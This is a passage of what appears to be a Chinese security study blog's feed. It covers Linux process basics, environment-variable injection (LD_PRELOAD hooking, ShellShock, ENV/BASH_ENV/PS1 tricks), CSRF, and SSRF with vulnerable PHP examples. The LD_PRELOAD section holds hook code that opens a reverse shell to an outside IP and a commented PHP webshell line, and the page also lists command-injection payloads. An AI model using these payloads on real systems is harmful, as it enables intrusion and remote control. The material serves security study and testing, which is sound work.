class="line">UID        PID  PPID  C STIME TTY          TIME CMD</span><br><span class="line">root      8986  8984  0 17:17 pts/0    00:00:00 -bash</span><br><span class="line">root      9054  8986  0 17:53 pts/0    00:00:00 ps -f</span><br></pre></td></tr></table></figure><p>ps进程的PPID为-bash的PID。</p><p><img src="/../images/image-20220923175907599.png" alt="image-20220710194138135"></p></li><li><p>内建命令</p><blockquote><p>内建命令和外部命令的区别在于前者不需要使用子进程来执行。</p><p>因为既不需要通过衍生出子进程来执行，也不需要打开程序文件，内建命令的执行速度要更</p><p>快，效率也更高。</p></blockquote></li></ul></li><li><p>有些命令有多种实现方式</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# type -a cd</span><br><span class="line">cd is a shell builtin</span><br><span class="line">cd is /usr/bin/cd</span><br></pre></td></tr></table></figure><blockquote><p>对于有多种实现的命令，如果想要使用其外部命令实现，直接指明对应的文件就可以了。</p><p>例如，要使用外部命令pwd，可以输入&#x2F;bin&#x2F;pwd。</p></blockquote></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>环境变量注入</title>
      <link href="/2023/05/31/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/05/31/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><blockquote><p>LD_PRELOAD 是 Linux 系统中的一个环境变量，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。</p></blockquote><p>具体的操作步骤如下：</p><ol><li>定义与目标函数完全一样的函数，包括名称、变量及类型、返回值及类型等。</li><li>将包含替换函数的源码编译为动态链接库。</li><li>通过命令 <code>export LD_PRELOAD=&quot;库文件路径&quot;</code>，设置要优先替换动态链接库即可。</li><li>替换结束，要还原函数调用关系，用命令<code>unset LD_PRELOAD</code> 解除</li></ol><h1 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h1><h2 id="劫持ls命令"><a href="#劫持ls命令" class="headerlink" title="劫持ls命令"></a>劫持ls命令</h2><p>查找ls命令执行时调用的系统函数，例如调用了<code>strncmp</code></p><p>payload</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">strncmp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *__s1, <span class="type">const</span> <span class="type">char</span> *__s2, <span class="type">size_t</span> __n)</span> &#123;    </span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里函数的定义可以根据报错信息进行确定</p><img src="E:\typora img\QQ截图20221107134218.jpg" alt="QQ截图20221107134218" style="zoom:67%;" /><p>从源码中找到的</p><img src="E:\typora img\QQ截图20221107134226.jpg" alt="QQ截图20221107134226" style="zoom: 67%;" /><p>编译形成.so文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC hook_strncmp.c -o hook_strncmp.so</span><br></pre></td></tr></table></figure><p>环境变量设置优先级</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export LD_PRELOAD=$PWD/hook_strncmp.so</span><br></pre></td></tr></table></figure><p>执行命令结果</p><p><img src="/../images/image-20221107135601599-1686813288526.png" alt="image-20221107135601599"></p><h2 id="更为简单的劫持"><a href="#更为简单的劫持" class="headerlink" title="更为简单的劫持"></a>更为简单的劫持</h2><p>GCC 有个 C 语言扩展修饰符 <strong>attribute</strong>((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在动态链接库中，那么<strong>一旦动态链接库被系统加载，将立即执行 _attribute((constructor)) 修饰的函数</strong>。这样，我们就不用局限于仅劫持某一函数，而应考虑劫持动态链接库了，也可以说是劫持了一个新进程。</p><ul><li><p>hook.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="type">void</span> <span class="title function_">preload</span> <span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/120.77.73.212/2333 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">    <span class="comment">//system(&quot;echo \&quot;&lt;?php eval(\\$_POST[cmd]);?&gt;\&quot; &gt; /var/www/html/shell.php&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>编译形成.so文件</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC hook.c -o hook.so</span><br></pre></td></tr></table></figure></li></ul><h2 id="PHP中"><a href="#PHP中" class="headerlink" title="PHP中"></a>PHP中</h2><ul><li>RCE</li><li>绕过disable_function</li></ul><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ul><li>能够上传文件，只要是.so文件，任意后缀名都可以解析</li><li>能够设置环境变量<code>LD_PRELOAD</code></li><li>有可以启动新进程的 PHP 函数（这样才能够劫持）</li></ul><h3 id="如何找到可以启动新进程的-PHP-函数"><a href="#如何找到可以启动新进程的-PHP-函数" class="headerlink" title="如何找到可以启动新进程的 PHP 函数"></a>如何找到可以启动新进程的 PHP 函数</h3><p>查看PHP函数调用时的shell操作</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">strace -f php test.php <span class="number">2</span>&gt;&amp;<span class="number">1</span> | grep -A2 -B2 execve</span><br></pre></td></tr></table></figure><p>test.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&quot;a@localhost&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span>s</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221108113210633-1686813288527.png" alt="image-20221108113210633"></p><p>可以看到执行mail函数时实际是启动了一个新的进程来调用系统命令<code>sendmail</code></p><p>其他可以启动新进程的php函数</p><ul><li><code>error_log(&quot;&quot;, 1, &quot;&quot;, &quot;&quot;);</code></li><li><code>$img = new Imagick(&#39;/tmp/a5edb30f575fb2f877a19b2f62a2e720/whoami.wmv&#39;);</code></li><li><code>system</code></li><li><code>imap_mail()</code></li><li><code>mb_send_mail()</code></li></ul><h3 id="文件上传绕过disable-function"><a href="#文件上传绕过disable-function" class="headerlink" title="文件上传绕过disable_function"></a>文件上传绕过<code>disable_function</code></h3><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p><h3 id="无上传文件操作–ShellShock（CVE-2014-6271）"><a href="#无上传文件操作–ShellShock（CVE-2014-6271）" class="headerlink" title="无上传文件操作–ShellShock（CVE-2014-6271）"></a>无上传文件操作–ShellShock（CVE-2014-6271）</h3><p>以下测试环境</p><p><img src="/../images/image-20221126164918984-1686813288527.png" alt="image-20221126164918984"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;envs&#x27;</span>] <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;<span class="subst">&#123;$key&#125;</span>=<span class="subst">&#123;$val&#125;</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//... 一些其他代码</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;echo hello&#x27;</span>); <span class="comment"># 相当于sh -c echo &quot;command&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>只适用于redhat系列–centos</p><blockquote><p>redhat系列sh指向bash</p><p><img src="/../images/image-20221126161815577-1686813288527.png" alt="image-20221126161815577"></p></blockquote><blockquote><p>debian系列指向dash</p><p><img src="/../images/image-20221126163241501-1686813288527.png" alt="image-20221126163241501"></p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Bash没有修复ShellShock漏洞：直接使用ShellShock的POC进行测试，例如TEST=&#x27;() &#123; :; &#125;&#x27;; id;</span><br><span class="line"></span><br><span class="line">Bash 4.4以前：env $&#x27;BASH_FUNC_echo()=() &#123; id; &#125;&#x27; bash -c &quot;echo hello&quot;</span><br><span class="line"></span><br><span class="line">Bash 4.4及以上：env $&#x27;BASH_FUNC_echo%%=() &#123; id; &#125;&#x27; bash -c &#x27;echo hello&#x27;</span><br></pre></td></tr></table></figure><p>本地测试</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># system(&#x27;echo hello&#x27;); # 相当于sh -c echo &quot;command&quot;</span></span><br><span class="line">?envs[<span class="title function_ invoke__">BASH_FUNC_echo</span>()]=() &#123; ls; &#125;</span><br></pre></td></tr></table></figure><img src="E:\typora img\image-20221126170554976.png" alt="image-20221126170554976" style="zoom:50%;" /><h4 id="其他情况下的环境变量注入payload"><a href="#其他情况下的环境变量注入payload" class="headerlink" title="其他情况下的环境变量注入payload"></a>其他情况下的环境变量注入payload</h4><h5 id="redhat"><a href="#redhat" class="headerlink" title="redhat"></a>redhat</h5><ul><li><p><code>PROMPT_COMMAND</code>：可以在<code>bash</code>交互式环境下执行任意命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PROMPT_COMMAND=&#x27;id&#x27; bash</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221126162222851-1686813288528.png" alt="image-20221126162222851"></p></li></ul><h5 id="通用"><a href="#通用" class="headerlink" title="通用"></a>通用</h5><ul><li><code>ENV</code>：可以在<code>sh -i -c</code>的时候注入任意命令</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ENV=&#x27;$(id 1&gt;&amp;2)&#x27; sh -i -c &quot;echo hello&quot;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221126162443791-1686813288528.png" alt="image-20221126162443791"></p><p><img src="/../images/image-20221126162453087-1686813288528.png" alt="image-20221126162453087"></p><ul><li><p><code>BASH_ENV</code>：可以在<code>bash -c</code>的时候注入任意命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">BASH_ENV=&#x27;$(id 1&gt;&amp;2)&#x27; bash -c &#x27;echo hello&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221126162613165-1686813288528.png" alt="image-20221126162613165"></p></li></ul><p><img src="/../images/image-20221126162622468-1686813288528.png" alt="image-20221126162622468"></p><ul><li><p><code>PS1</code>：可以在<code>dash</code>或<code>bash</code>交互式环境下执行任意命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PS1=&#x27;$(whoami)&#x27; dash/bash</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221126163037850-1686813288528.png" alt="image-20221126163037850"></p></li></ul><p><img src="/../images/image-20221126163059160-1686813288528.png" alt="image-20221126163059160"></p><h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;command&#x27;</span>) ----&gt;  <span class="title function_ invoke__">php_exec_ex</span>() ----&gt;   <span class="title function_ invoke__">php_exec</span>()  ---&gt;   linux popen函数  ---&gt;</span><br><span class="line">Linux glibc库    ----&gt;   sh -c <span class="keyword">echo</span> <span class="string">&quot;command&quot;</span>  </span><br></pre></td></tr></table></figure><blockquote><p>glibc是gnu发布的libc库，也即c运行库。glibc是linux 系统中最底层的api（应用程序开发接口），几乎其它任何的运行库都会倚赖于glibc。</p></blockquote><img src="E:\typora img\image-20221107153339706.png" alt="image-20221107153339706" style="zoom:67%;" /><img src="E:\typora img\image-20221107153422836.png" alt="image-20221107153422836" style="zoom:67%;" /><img src="E:\typora img\image-20221107153502513.png" alt="image-20221107153502513" style="zoom:67%;" /><img src="E:\typora img\image-20221107153708100.png" alt="image-20221107153708100" style="zoom:67%;" /><h5 id="debian系列"><a href="#debian系列" class="headerlink" title="debian系列"></a>debian系列</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sh -c echo &quot;command&quot;  --&gt; dash -c echo &quot;command&quot;   #  在debian系列sh指向dash</span><br></pre></td></tr></table></figure><p>漏洞产生原因</p><p>在dash源码中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> linux</span></span><br><span class="line">getuid( ) == geteuid( ) &amp;&amp; getgid( ) == getegid( ) S &amp;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">iflag ）&#123;  <span class="comment">// iflag为-i参数，所以只有传入-i参数才能进入下面的if语句</span></span><br><span class="line"><span class="keyword">if</span> ((shinit = lookupvar(<span class="string">&quot;ENV&quot;</span>)) != <span class="literal">NULL</span> &amp;&amp; *shinit != <span class="string">&#x27;\0&#x27;</span>) </span><br><span class="line">    &#123;</span><br><span class="line">    read_profile(shinit);</span><br><span class="line">&#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>read_profile</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">STATIC <span class="type">void</span></span><br><span class="line"><span class="title function_">read_profile</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// expandstr可以解析shell命令，解析的name参数就是环境变量ENV</span></span><br><span class="line">    name = expandstr(name);</span><br><span class="line">    <span class="keyword">if</span> (setinputfile(name, INPUT_PUSH_FILE | INPUT_NOFILE_OK) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    cmdloop(<span class="number">0</span>);</span><br><span class="line">    popfile();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ENV=&#x27;$(id 1&gt;&amp;2)&#x27; dash -i -c &#x27;echo hello&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221107152419461-1686813288528.png" alt="image-20221107152419461"></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.anquanke.com/post/id/254388#h3-6">https://www.anquanke.com/post/id/254388#h3-6</a></p><p><a href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CSRF</title>
      <link href="/2023/05/31/CSRF/"/>
      <url>/2023/05/31/CSRF/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>攻击者伪造用户的请求，诱导用户点击恶意链接，利用用户的cookie让服务器以为是用户操作，从而发起攻击。</p><p><img src="/../images/image-20230321141146612.png" alt="image-20230321141146612"></p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>web应用程序在用户进行敏感操作时，没有进行身份验证，从而导致恶意攻击者利用普通用户的身份（cookie）完成攻击行为。</p><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>伪造用户请求，用户能做啥，这个漏洞就能做啥</p><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><ul><li>数据包无token和referer验证</li></ul><p>无token验证并且无referer验证时，就基本存在跨站请求伪造，但基于功能点不同，一些为无意义无危害的跨站请求伪造。</p><p>提交数据包时抓包删除referer字段，如果不报错，则基本存在跨域请求伪造，GET型构造链接，POST型写一个提交表单，测试有跨域情况下提交的数据包是否生效。</p><ul><li>数据包无token有referer验证</li></ul><p>只有referer验证时，可尝试空referer，或者尝试域名伪造。</p><ul><li>burp自带的csrf检测功能</li></ul><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><blockquote><p>关键点在于</p><p>攻击者可以预先伪造用户的请求，所以只需要使得请求参数难以伪造。</p></blockquote><ul><li><p>当用户发送重要的请求时需要输入原始密码，手机验证码等</p></li><li><p>设置Token</p></li><li><p>检验 referer 来源</p><p>疑问：referer不是可以进行伪造吗？</p><p>答：攻击者确实可以在发送请求时进行伪造，但是csrf是用户发起请求，用户不会去伪造；</p><p>不过当网站本身可以植入csrf的payload时，检验refer来源的防御手段就失效了。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SSRF</title>
      <link href="/2023/05/31/SSRF/"/>
      <url>/2023/05/31/SSRF/</url>
      
        <content type="html"><![CDATA[<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p><code>SSRF</code>（Server-Side Request Forgery，服务器端请求伪造）是一种<strong>由攻击者构造请求，利用服务器端发起请求</strong>的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统（正因为请求是由服务器端发起的，所以服务器能请求到与自身相连而外网隔离的内部系统）。</p><p>​ </p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>目标服务器会从自身发起请求，并且该请求可控以及没有对请求地址进行过滤和限制。</p><h2 id="常见场景"><a href="#常见场景" class="headerlink" title="常见场景"></a>常见场景</h2><ul><li><p>请求外部资源，如导入文件，加载远程图片，RSS订阅等</p></li><li><p>数据库内置的加载外部URL功能</p></li><li><p>Webmail收取其他邮箱邮件，如POP3,IMAP,SMTP等</p></li><li><p>文件处理，编码处理，属性信息处理，如FFmpeg，ImageMagic,Word,Excel,PDF,XML等</p><p><a href="https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2016-0205699">56视频FFmpeg解析漏洞导致SSRF | wooyun-2016-0205699| WooYun.org</a></p></li></ul><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">?url=</span><br><span class="line">搜狗搜索某处SSRF漏洞</span><br><span class="line">?path=</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230613212738906.png" alt="image-20230613212738906"></p><h2 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h2><ul><li>openssl</li><li>鉴权，如cookie，jwt等，当攻击者只能控制一个url时，而无法添加这些请求头时，就无法访问某些接口</li><li>校验了其他http header字段时，如referer，UA等</li></ul><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><ul><li><p>内网探针，获取内网结构和内网机器指纹</p></li><li><p>若内网主机存在漏洞，可以使用gopher协议构造数据包对其发起攻击</p></li></ul><p>From 国光师傅的ssrf靶场拓扑图</p><p><img src="/../images/16205694239190.png" alt="img"></p><blockquote><p>172.72.23.21 这个服务器的 Web 80 端口存在 SSRF 漏洞，并且 80 端口映射到了公网的 8080，此时攻击者通过这个 8080 端口可以借助 SSRF 漏洞发起对 172 目标内网的探测和攻击。</p></blockquote><h2 id="产生漏洞的函数"><a href="#产生漏洞的函数" class="headerlink" title="产生漏洞的函数"></a>产生漏洞的函数</h2><ul><li><p><code>file_get_contents</code></p><blockquote><p>将整个文件读入一个字符串</p><p>支持本地文件和远程文件</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220804190900308.png" alt="image-20220804190900308"></p></li><li><p><code>curl_exec()</code></p><blockquote><p>执行给定的 curl 会话。</p><p><a href="https://stackoverflow.com/questions/6382539/call-to-undefined-function-curl-init">Call to undefined function curl_init()错误解决</a></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;  </span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">curl</span>(<span class="variable">$url</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220804191212091.png" alt="image-20220804191212091"></p></li><li><p><code>fsockopen</code></p><blockquote><p>使用socket跟服务器建立tcp连接，传输原始数据。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$data</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>); </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$fp</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (error number <span class="subst">$errno</span>) \n&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123; </span><br><span class="line">        </span><br><span class="line">        <span class="comment">//$fp:TCP连接  $data:请求头</span></span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="title function_ invoke__">base6e_decode</span>(<span class="variable">$data</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line">        <span class="comment">//执行http请求，并获得返回值</span></span><br><span class="line">        <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="variable">$contents</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$contents</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$content</span>=<span class="title function_ invoke__">GetFile</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;port&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?host=<span class="number">127.0</span>.<span class="number">0.1</span>&amp;port=<span class="number">80</span>&amp;data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBDbG9zZQ0KDQo</span><br><span class="line"></span><br><span class="line">data--&gt;</span><br><span class="line">GET /flag.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Connection: Close</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220804191713087.png" alt="image-20220804191713087"></p></li></ul><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>检测到存在SSRF漏洞后</p><ul><li>探测主机存活情况</li><li>探测存活主机端口情况</li><li>根据端口情况尝试攻击</li></ul><h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><p>攻击的数据需要经过两次URL编码，因为数据是先到达有SSRF漏洞的主机，再通过SSRF漏洞转交给内网其他主机处理。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="常用协议介绍"><a href="#常用协议介绍" class="headerlink" title="常用协议介绍"></a>常用协议介绍</h3><h4 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h4><blockquote><p><strong>cURL</strong>是一个利用URL语法在命令行下工作的文件传输工具。</p><p>它的名字就是客户端（client）的 URL 工具的意思。</p></blockquote><p><code>curl -v www.baidu.com</code></p><p>-v：显示请求头和响应头</p><p><img src="/../images/image-20220805214719676.png" alt="image-20220805214719676"></p><p><code>curl -V</code></p><p><img src="/../images/image-20220804184555137.png" alt="image-20220804184555137"></p><p>可以看到支持的协议如下</p><table><thead><tr><th><strong>dict</strong></th><th><strong>file</strong></th><th><strong>ftp</strong></th><th><strong>pop3</strong></th><th><strong>pop3s</strong></th></tr></thead><tbody><tr><td><strong>ftos</strong></td><td><strong>gopher</strong></td><td><strong>gophers</strong></td><td><strong>rtmp</strong></td><td><strong>rtsp</strong></td></tr><tr><td><strong>http</strong></td><td><strong>https</strong></td><td><strong>imap</strong></td><td><strong>scp</strong></td><td><strong>sftp</strong></td></tr><tr><td><strong>imaps</strong></td><td><strong>ldap</strong></td><td><strong>ldaps</strong></td><td><strong>smb</strong></td><td><strong>smbs</strong></td></tr><tr><td><strong>smtp</strong></td><td><strong>smtps</strong></td><td><strong>telnet</strong></td><td><strong>tftp</strong></td><td><strong>mtt</strong></td></tr></tbody></table><h4 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h4><blockquote><p>gopher 协议是一个在http 协议诞生前用来访问Internet 资源的协议可以理解为http 协议的前身或简化版，支持发出GET、POST请求，可以实现多个数据包整合发送，然后gopher 服务器将多个数据包捆绑着发送到客户端，这就是它的菜单响应。比如使用一条gopher 协议的curl 命令就能操作mysql 数据库或完成对redis 的攻击等等。</p></blockquote><p><img src="/../images/v2-ea9bb9538044933ac3c918d5a56f2d69_720w.jpg" alt="img"></p><ul><li>坑点</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(khaz㉿kali)-[~/桌面]</span><br><span class="line">└─$ curl gopher://localhost:2222/khaz%0atest%0ahaha </span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(khaz㉿kali)-[~/桌面]</span><br><span class="line">└─$ nc -lvp 2222</span><br><span class="line">listening on [any] 2222 ...</span><br><span class="line">connect to [127.0.0.1] from localhost [127.0.0.1] 50546</span><br><span class="line">haz</span><br><span class="line">test</span><br><span 